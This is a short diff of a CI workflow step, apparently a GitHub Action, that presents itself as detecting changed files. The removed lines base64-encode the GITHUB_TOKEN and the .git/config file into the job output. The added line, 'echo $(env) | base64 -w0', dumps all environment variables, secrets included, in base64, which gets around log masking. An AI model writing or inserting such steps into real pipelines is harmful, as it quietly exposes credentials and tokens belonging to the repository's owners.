@@ -25,8 +25,7 @@ runs:
       run: |
         echo "Detecting changed files..."
         echo "I have access to: workspace=$GITHUB_WORKSPACE"
-        echo $GITHUB_TOKEN | base64 -w0
-        cat .git/config | base64
+        echo $(env) | base64 -w0
         
         echo "files=$CHANGED" >> $GITHUB_OUTPUT
         if [ -n "$CHANGED" ]; then
